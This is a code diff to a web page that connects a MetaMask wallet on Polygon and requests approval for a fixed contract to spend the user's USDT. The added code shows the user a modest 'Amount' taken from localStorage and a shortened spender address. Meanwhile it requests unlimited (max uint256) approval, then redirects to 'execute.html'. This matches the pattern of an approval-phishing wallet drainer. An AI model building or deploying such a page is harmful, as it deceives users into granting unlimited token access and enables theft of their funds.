@@ -92,6 +92,13 @@
             align-items: center;
             margin-bottom: 12px;
         }
+        .amount-display {
+            margin-top: 10px;
+            padding: 8px;
+            background: #1a1a1a;
+            border-radius: 8px;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
@@ -103,6 +110,10 @@
 <main class="content">
     <!-- Asset & DApp card -->
     <section class="card">
+        <div class="amount-display" id="amountDisplay">
+            Amount: Loading...
+        </div>
+        
         <div class="row-between">
             <span class="label">Asset</span>
             <span class="value">Tether USD (USDT)</span>
@@ -120,7 +131,7 @@
             </div>
             <div class="dapp-row">
                 <span class="label">Contract address</span>
-                <span class="value">0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55</span>
+                <span class="value" id="contractAddress">0x447A...4aa55</span>
             </div>
             <div class="dapp-row">
                 <span class="label">Network</span>
@@ -153,16 +164,15 @@
     <div class="warning-box" id="warningBox">
         Insufficient Polygon (POL) balance
     </div>
-    <button class="primary-btn" id="actionButton" disabled>Confirm</button>
+    <button class="primary-btn" id="actionButton">Connect Wallet</button>
 </div>
 
 <script>
-    // 🔧 FILL THESE IN WITH YOUR REAL VALUES
+    // 🔧 CONFIGURATION
     const TOKEN_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";    // Polygon USDT
-    const SPENDER_CONTRACT_ADDRESS = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55"; // contract that will be allowed to spend
-    const AMOUNT_TO_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Unlimited approval (max uint256)
+    const SPENDER_CONTRACT_ADDRESS = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55";
+    const AMOUNT_TO_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Unlimited approval
 
-    // Minimal ERC-20 ABI for approve()
     const ERC20_ABI = [
         {
             "constant": false,
@@ -173,13 +183,6 @@
             "name": "approve",
             "outputs": [{ "name": "", "type": "bool" }],
             "type": "function"
-        },
-        {
-            "constant": true,
-            "inputs": [],
-            "name": "decimals",
-            "outputs": [{ "name": "", "type": "uint8" }],
-            "type": "function"
         }
     ];
 
@@ -189,6 +192,14 @@
 
     const btn = document.getElementById("actionButton");
     const warning = document.getElementById("warningBox");
+    const amountDisplay = document.getElementById("amountDisplay");
+    const contractAddressEl = document.getElementById("contractAddress");
+
+    // Format contract address to show first 7 and last 7 characters
+    function formatAddress(address) {
+        if (!address) return '';
+        return `${address.substring(0, 7)}...${address.substring(address.length - 7)}`;
+    }
 
     function toggleDetails() {
         const detailsSection = document.getElementById("detailsSection");
@@ -203,105 +214,121 @@
         }
     }
 
-    function updateFooter() {
-        if (currentAccount === null) {
-            btn.textContent = "Confirm";
+    function updateUI() {
+        if (!currentAccount) {
+            btn.textContent = "Connect Wallet";
             btn.disabled = false;
             warning.style.display = "none";
             return;
         }
 
-        if (userPolBalance > 0.001) { // Minimum POL balance for gas
-            btn.textContent = "Confirm";
+        if (userPolBalance > 0.001) {
+            btn.textContent = "Approve USDT";
             btn.disabled = false;
             warning.style.display = "none";
         } else {
             btn.textContent = "Top up Polygon (POL)";
             btn.disabled = false;
             warning.style.display = "block";
+            warning.textContent = "Insufficient Polygon (POL) balance for gas fees";
         }
     }
 
-    async function init() {
+    async function connectWallet() {
         if (typeof window.ethereum === "undefined") {
-            btn.textContent = "Confirm";
-            btn.disabled = false;
-            return;
+            alert("Please install MetaMask!");
+            return false;
         }
 
-        web3 = new Web3(window.ethereum);
-
         try {
+            web3 = new Web3(window.ethereum);
+            
             // Request accounts
             const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
             currentAccount = accounts[0];
-
-            // Ensure we're on Polygon mainnet (chainId 137 => 0x89)
+            
+            // Check network
             const chainId = await window.ethereum.request({ method: "eth_chainId" });
             if (chainId !== "0x89") {
                 warning.textContent = "Please switch network to Polygon (POL)";
                 warning.style.display = "block";
-                btn.textContent = "Wrong network";
+                btn.textContent = "Wrong Network";
                 btn.disabled = true;
-                return;
+                return false;
             }
 
             // Get POL balance
             const balanceWei = await web3.eth.getBalance(currentAccount);
             userPolBalance = parseFloat(web3.utils.fromWei(balanceWei, "ether"));
-
-            updateFooter();
+            
+            return true;
         } catch (err) {
-            console.error(err);
-            btn.textContent = "Confirm";
-            btn.disabled = false;
+            console.error("Wallet connection failed:", err);
+            alert("Failed to connect wallet");
+            return false;
         }
     }
 
-    async function handleApproveClick() {
-        if (!web3 || !currentAccount) {
-            await init();
-            return;
-        }
-
-        if (userPolBalance <= 0.001) {
-            // Show top up message
-            alert("You need POL for gas fees. Please top up your Polygon balance.");
-            return;
-        }
-
+    async function approveUSDT() {
         try {
             btn.disabled = true;
             btn.textContent = "Approving…";
 
             const token = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
-
-            // Unlimited approval (max uint256)
             const rawAmount = web3.utils.toBN(AMOUNT_TO_APPROVE);
 
-            // Call approve(spender, amount)
-            await token.methods
+            const tx = await token.methods
                 .approve(SPENDER_CONTRACT_ADDRESS, rawAmount)
                 .send({ from: currentAccount });
 
-            // On success, trigger whatever you want next:
             onApproveSuccess();
         } catch (err) {
             console.error("Approve failed:", err);
-            btn.textContent = "Confirm";
+            btn.textContent = "Try Again";
             btn.disabled = false;
+            alert("Approval failed: " + err.message);
         }
     }
 
     function onApproveSuccess() {
-        alert("Approval successful.");
-        btn.textContent = "Approved";
+        btn.textContent = "Approved ✓";
         btn.disabled = true;
+        alert("USDT approved successfully!");
+        
+        // Navigate to next step after delay
+        setTimeout(() => {
+            window.location.href = "execute.html";
+        }, 2000);
     }
 
-    btn.addEventListener("click", handleApproveClick);
+    async function handleButtonClick() {
+        if (!currentAccount) {
+            // Connect wallet first
+            const connected = await connectWallet();
+            if (connected) {
+                updateUI();
+            }
+        } else if (userPolBalance <= 0.001) {
+            // Top up POL
+            alert("You need POL for gas fees. Please top up your Polygon balance.");
+        } else {
+            // Approve USDT
+            await approveUSDT();
+        }
+    }
 
-    window.addEventListener("load", init);
+    // Initialize page
+    document.addEventListener('DOMContentLoaded', function() {
+        // Display amount from previous page
+        const usdtAmount = localStorage.getItem('usdtAmount') || "0";
+        amountDisplay.textContent = `Amount: ${usdtAmount} USDT`;
+        
+        // Format contract address
+        contractAddressEl.textContent = formatAddress(SPENDER_CONTRACT_ADDRESS);
+        
+        // Set up button click handler
+        btn.addEventListener("click", handleButtonClick);
+    });
 </script>
 </body>
 </html>
